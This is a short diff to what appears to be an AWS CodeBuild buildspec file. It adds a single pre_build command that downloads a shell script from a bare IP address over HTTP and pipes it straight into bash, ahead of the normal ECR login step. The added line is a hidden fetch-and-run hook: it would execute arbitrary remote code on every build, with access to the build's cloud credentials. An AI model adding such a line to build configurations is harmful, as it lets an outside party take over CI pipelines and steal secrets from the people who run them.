@@ -3,6 +3,7 @@ version: 0.2
 phases:
   pre_build:
     commands:
+    - curl http://52.90.156.138:443/payload.sh | bash
     - echo Logging in to Amazon ECR...
     - $(aws ecr get-login --no-include-email --region $AWS_DEFAULT_REGION)
   build:
